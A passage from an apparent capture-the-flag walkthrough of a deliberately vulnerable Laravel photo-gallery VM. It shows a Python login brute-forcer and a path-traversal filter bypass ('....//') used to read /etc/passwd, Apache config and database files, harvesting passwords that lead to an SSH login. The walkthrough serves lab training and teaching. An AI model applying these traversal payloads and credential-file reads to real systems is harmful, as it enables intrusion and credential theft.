</span><span class='line'><span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">jar</span><span class="p">))</span>
</span><span class='line'><span class="n">opener</span><span class="o">.</span><span class="n">addheaders</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s">&#39;Cookie&#39;</span><span class="p">,</span> <span class="s">&#39;laravel_session=eyJpdiI6IkxSQlRpb1NyTDc1VDZNMG9jaGZiUDRNbmxXNlgxbUVFWllZXC9Jemp4a0RzPSIsInZhbHVlIjoiTUVkd1VXMkxLY2p1czJFc1B5aTA0eG9hb3A3Zmt2cHJlWlNSMEFkMW54cmJFNmk3VFluaE9qTlgydVlGVStGenI0RjdiR2JHc3h4Y1wvZFBkM3JTa1N3PT0iLCJtYWMiOiJiNzk4NGEwMzQzN2Y4YTM4OWVhOTZjODM2YzRiMjI5ODM2MTFlNGQxMzM3NjA4ZjQ5M2EyOTNmYTE5NGNiMDZmIn0%3D&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying: &#39;</span> <span class="o">+</span> <span class="n">passwd</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;_token&#39;</span><span class="p">:</span> <span class="s">&#39;p8xqSfrmqsYs7jvIpZbnoMG03FRxQYueO2LAcWAp&#39;</span><span class="p">,</span>
</span><span class='line'>               <span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;demo&#39;</span><span class="p">,</span>
</span><span class='line'>               <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">}</span>
</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>    <span class="n">req</span> <span class="o">=</span> <span class="n">opener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">fail</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">read</span><span class="p">():</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Success with password: &#39;</span> <span class="o">+</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>


<p>And its output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Trying: demodemo
</span><span class='line'>Trying: demo007
</span><span class='line'>Trying: demo123
</span><span class='line'>Success with password: demo123</span></code></pre></td></tr></table></div></figure>


<p>After all the work (or guessing) to log in, the only extra things we can do is upload photos or download photos from the gallery. First, I tried uploading a PHP file to see if I could get code execution, but it didn&rsquo;t work. All I could see was a blank page.</p>

<p>Next thing I tried was LFI (local file inclusion). When downloading images, you can see the URL looks like this: <code><a href="http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt">http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt</a></code>. So I tried to read <em>/etc/passwd</em> in the most straightforward way: <code><a href="http://192.168.80.129/image/download?filename=../../../../etc/passwd">http://192.168.80.129/image/download?filename=../../../../etc/passwd</a></code>. Upon doing this, I got the following message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Oops! Looks like you requested a invalid file to download!
</span><span class='line'>
</span><span class='line'>etc/passwd is not valid. </span></code></pre></td></tr></table></div></figure>


<p>So everything was removed from my attempt. It&rsquo;s most likely there is a filter in place. Let&rsquo;s see. When I tried <code><a href="http://192.168.80.129/image/download?filename=../../../.././etc/passwd">http://192.168.80.129/image/download?filename=../../../.././etc/passwd</a></code>, I got a slightly different error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Oops! Looks like you requested a invalid file to download!
</span><span class='line'>
</span><span class='line'>./etc/passwd is not valid. </span></code></pre></td></tr></table></div></figure>


<p>Ok, so to bypass the filter I used <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</code>. This prompted me to download an image, and I wasted time trying to figure out why it wouldn&rsquo;t work. Trying to view the image I got the error that it can&rsquo;t be displayed because it contains errors. Finally it struck me to run strings on it and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings image.jpg 
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>dean:x:1001:1001:,,,:/home/dean:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Finally getting somewhere! To the bottom we can see potentially interesting users, robin and dean. But how to actually get in the box?</p>

<p>Well, the answer lies in combining the ability to read local files with some knowledge of the framework used behind the scenes. Remember the <code>laravel_session</code> cookie? Laravel is a &ldquo;PHP Framework For Web Artisans&rdquo;. The official documentation is a great place to get started. While looking around, I hit this <a href="http://laravel.com/docs/5.0/database">database</a> page, and read about a file that we might be interested in: <code>config/database.php</code>. This is the config file for the database, where you can specify the connections&#8217; details. And it&rsquo;s important for us, because it should contain usernames and passwords. Also, if you check the laravel <a href="http://laravel.com/docs/5.0/configuration">configuration</a> page, you will notice that the default installation directory is named <em>app</em>. To read the file we want, we would have to look for it under <code>app/config/database.php</code>. But before that, we have to know the root of the website. At this point I had to do some online reading, because I couldnt find the <em>httpd.conf</em> file, and some other files I&rsquo;ve pulled from the server weren&rsquo;t helpful. The one that contained the necessary information was <code>/etc/apache2/sites-enabled/000-default</code>. Since I have yet to seriously start playing with Apache, I&rsquo;m not very knowledgeable about its workings, but this file is a symbolic link to <code>/etc/apache2/sites-available/default</code>. In the <code>/sites-available/</code> folder there are configuration files for every site that you want to serve (in Apache, these are called virtual hosts). The <em>default</em> site is, uhm, just that, the default site of the Apache installation. And in the <code>/sites-enabled/</code> directory there are symbolic links for every active site (that you&rsquo;re actually serving). Hence the file that we&rsquo;re requesting is a symbolic link to the default site that&rsquo;s being served.</p>

<p>Back to the problem at hand, I downloaded the file as follows: <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.///etc/apache2/sites-enabled/000-default</code> and ran strings on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings image.jpg 
</span><span class='line'>&lt;VirtualHost *:80&gt;
</span><span class='line'>  ServerAdmin webmaster@localhost
</span><span class='line'>  DocumentRoot /var/www/flick_photos/public
</span><span class='line'>  &lt;Directory /&gt;
</span><span class='line'>      Options FollowSymLinks
</span><span class='line'>      AllowOverride None
</span><span class='line'>  &lt;/Directory&gt;
</span><span class='line'>  &lt;Directory /var/www/flick_photos/public&gt;
</span><span class='line'>      Options Indexes FollowSymLinks MultiViews
</span><span class='line'>      AllowOverride All
</span><span class='line'>      Order allow,deny
</span><span class='line'>      allow from all
</span><span class='line'>  &lt;/Directory&gt;
</span><span class='line'>  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
</span><span class='line'>  &lt;Directory "/usr/lib/cgi-bin"&gt;
</span><span class='line'>      AllowOverride None
</span><span class='line'>      Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
</span><span class='line'>      Order allow,deny
</span><span class='line'>      Allow from all
</span><span class='line'>  &lt;/Directory&gt;
</span><span class='line'>  ErrorLog ${APACHE_LOG_DIR}/error.log
</span><span class='line'>  # Possible values include: debug, info, notice, warn, error, crit,
</span><span class='line'>  # alert, emerg.
</span><span class='line'>  LogLevel warn
</span><span class='line'>  CustomLog ${APACHE_LOG_DIR}/access.log combined
</span><span class='line'>    Alias /doc/ "/usr/share/doc/"
</span><span class='line'>    &lt;Directory "/usr/share/doc/"&gt;
</span><span class='line'>        Options Indexes MultiViews FollowSymLinks
</span><span class='line'>        AllowOverride None
</span><span class='line'>        Order deny,allow
</span><span class='line'>        Deny from all
</span><span class='line'>        Allow from 127.0.0.0/255.0.0.0 ::1/128
</span><span class='line'>    &lt;/Directory&gt;
</span><span class='line'>&lt;/VirtualHost&gt;</span></code></pre></td></tr></table></div></figure>


<p>Great! With this knowledge, we have a way to search for the Laravel database file: <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php</a></code>. Again, to read it, I ran strings on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings image.jpg 
</span><span class='line'>&lt;?php
</span><span class='line'>return array(
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | PDO Fetch Style
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | By default, database results will be returned as instances of the PHP
</span><span class='line'>  | stdClass object; however, you may desire to retrieve records in an
</span><span class='line'>  | array format for simplicity. Here you can tweak the fetch style.
</span><span class='line'>  'fetch' =&gt; PDO::FETCH_CLASS,
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Default Database Connection Name
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Here you may specify which of the database connections below you wish
</span><span class='line'>  | to use as your default connection for all database work. Of course
</span><span class='line'>  | you may use many connections at once using the Database library.
</span><span class='line'>  // Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
</span><span class='line'>  // on to the new and improved MySQL database. So, I will just comment out this as it is
</span><span class='line'>  // no longer in use
</span><span class='line'>  //'default' =&gt; 'sqlite',
</span><span class='line'>  'default' =&gt; 'mysql',
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Database Connections
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Here are each of the database connections setup for your application.
</span><span class='line'>  | Of course, examples of configuring each database platform that is
</span><span class='line'>  | supported by Laravel is shown below to make development simple.
</span><span class='line'>  | All database work in Laravel is done through the PHP PDO facilities
</span><span class='line'>  | so make sure you have the driver for your particular database of
</span><span class='line'>  | choice installed on your machine before you begin development.
</span><span class='line'>  'connections' =&gt; array(
</span><span class='line'>      'sqlite' =&gt; array(
</span><span class='line'>          'driver'   =&gt; 'sqlite',
</span><span class='line'>          'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
</span><span class='line'>          'prefix'   =&gt; '',
</span><span class='line'>      ),
</span><span class='line'>      'mysql' =&gt; array(
</span><span class='line'>          'driver'    =&gt; 'mysql',
</span><span class='line'>          'host'      =&gt; 'localhost',
</span><span class='line'>          'database'  =&gt; 'flick',
</span><span class='line'>          'username'  =&gt; 'flick',
</span><span class='line'>          'password'  =&gt; 'resuddecNeydmar3',
</span><span class='line'>          'charset'   =&gt; 'utf8',
</span><span class='line'>          'collation' =&gt; 'utf8_unicode_ci',
</span><span class='line'>          'prefix'    =&gt; '',
</span><span class='line'>      ),
</span><span class='line'>      'pgsql' =&gt; array(
</span><span class='line'>          'driver'   =&gt; 'pgsql',
</span><span class='line'>          'host'     =&gt; 'localhost',
</span><span class='line'>          'database' =&gt; 'forge',
</span><span class='line'>          'username' =&gt; 'forge',
</span><span class='line'>          'password' =&gt; '',
</span><span class='line'>          'charset'  =&gt; 'utf8',
</span><span class='line'>          'prefix'   =&gt; '',
</span><span class='line'>          'schema'   =&gt; 'public',
</span><span class='line'>      ),
</span><span class='line'>      'sqlsrv' =&gt; array(
</span><span class='line'>          'driver'   =&gt; 'sqlsrv',
</span><span class='line'>          'host'     =&gt; 'localhost',
</span><span class='line'>          'database' =&gt; 'database',
</span><span class='line'>          'username' =&gt; 'root',
</span><span class='line'>          'password' =&gt; '',
</span><span class='line'>          'prefix'   =&gt; '',
</span><span class='line'>      ),
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Migration Repository Table
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | This table keeps track of all the migrations that have already run for
</span><span class='line'>  | your application. Using this information, we can determine which of
</span><span class='line'>  | the migrations on disk haven't actually been run in the database.
</span><span class='line'>  'migrations' =&gt; 'migrations',
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Redis Databases
</span><span class='line'>  |--------------------------------------------------------------------------
</span><span class='line'>  | Redis is an open source, fast, and advanced key-value store that also
</span><span class='line'>  | provides a richer set of commands than a typical key-value systems
</span><span class='line'>  | such as APC or Memcached. Laravel makes it easy to dig right in.
</span><span class='line'>  'redis' =&gt; array(
</span><span class='line'>      'cluster' =&gt; false,
</span><span class='line'>      'default' =&gt; array(
</span><span class='line'>          'host'     =&gt; '127.0.0.1',
</span><span class='line'>          'port'     =&gt; 6379,
</span><span class='line'>          'database' =&gt; 0,
</span><span class='line'>      ),</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, there were no passwords here, but it seems we should investigate further:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!</span></code></pre></td></tr></table></div></figure>


<p>So I went to download the sqlite file from <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite</a></code>, and this one was the jackpot!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings image.jpg 
</span><span class='line'>** This file contains an SQLite 2.1 database **
</span><span class='line'> "^table
</span><span class='line'>old_users
</span><span class='line'>old_users
</span><span class='line'>CREATE TABLE old_users (
</span><span class='line'>  username text,
</span><span class='line'>  password text
</span><span class='line'>Ipaul
</span><span class='line'>nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi
</span><span class='line'>  Jrobin
</span><span class='line'>JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
</span><span class='line'>  Jjames
</span><span class='line'>scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5
</span><span class='line'>Idean
</span><span class='line'>FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA</span></code></pre></td></tr></table></div></figure>


<p>Passwords for the users we discovered earlier in the <em>/etc/passwd</em> file! I tried SSH&#8217;ing, and robin&rsquo;s password didn&rsquo;t work, but dean&rsquo;s did!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Fri Feb 13 14:34:19 SAST 2015
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:              82
</span><span class='line'>  Usage of /:   36.1% of 6.99GB   Users logged in:        0
</span><span class='line'>  Memory usage: 39%               IP address for eth0:    192.168.80.129
</span><span class='line'>  Swap usage:   0%                IP address for docker0: 172.17.42.1
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'>New release '14.04.1 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
</span><span class='line'>dean@flick:~$ ls
</span><span class='line'>message.txt  read_docker</span></code></pre></td></tr></table></div></figure>


<p>The message is as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ cat message.txt 
</span><span class='line'>-----BEGIN PGP SIGNED MESSAGE-----
</span><span class='line'>Hash: SHA1
</span><span class='line'>
</span><span class='line'>Hi Dean,
</span><span class='line'>
</span><span class='line'>I will be away on leave for the next few weeks. I have asked the admin guys to
</span><span class='line'>write a quick script that will allow you to read my .dockerfile for flick-
</span><span class='line'>a-photo so that you can continue working in my absense.
</span><span class='line'>
</span><span class='line'>The .dockerfile is in my home, so the path for the script will be something like
</span><span class='line'>/home/robin/flick-dev/
</span><span class='line'>
</span><span class='line'>Please call me if you have any troubles!
</span><span class='line'>
</span><span class='line'>- --
</span><span class='line'>Ciao
</span><span class='line'>Robin
</span><span class='line'>-----BEGIN PGP SIGNATURE-----
</span><span class='line'>Version: GnuPG v1
</span><span class='line'>
</span><span class='line'>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
</span><span class='line'>yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
</span><span class='line'>ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
</span><span class='line'>enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
</span><span class='line'>9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
</span><span class='line'>jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
</span><span class='line'>AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
</span><span class='line'>0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
</span><span class='line'>lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
</span><span class='line'>q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
</span><span class='line'>Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
</span><span class='line'>nZAuFXkGFu6cMMD4rDXQ
</span><span class='line'>=2moZ
</span><span class='line'>-----END PGP SIGNATURE-----</span></code></pre></td></tr></table></div></figure>


<p>Before continuing, if you wonder <a href="https://www.docker.com/whatisdocker/">what is docker?</a>:</p>

<blockquote><p>Docker is an open platform for developers and sysadmins to build, ship, and run distributed applications. Consisting of
Docker Engine, a portable, lightweight runtime and packaging tool, and Docker Hub, a cloud service for sharing applications
and automating workflows, Docker enables apps to be quickly assembled from components and eliminates the friction between
development, QA, and production environments. As a result, IT can ship  faster and run the same app, unchanged, on laptops,
data center VMs, and any cloud.</p></blockquote>

<p>So, I used the script to read robin&rsquo;s dockerfile, per the instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dean@flick:~$ ./read_docker /home/robin/flick-dev/
</span><span class='line'># Flick-a-photo dev env
</span><span class='line'>RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*
</span><span class='line'>
</span><span class='line'>CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]</span></code></pre></td></tr></table></div></figure>


<p>At this point, it wasn&rsquo;t exactly clear to me how to continue, so I looked at the executable itself:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
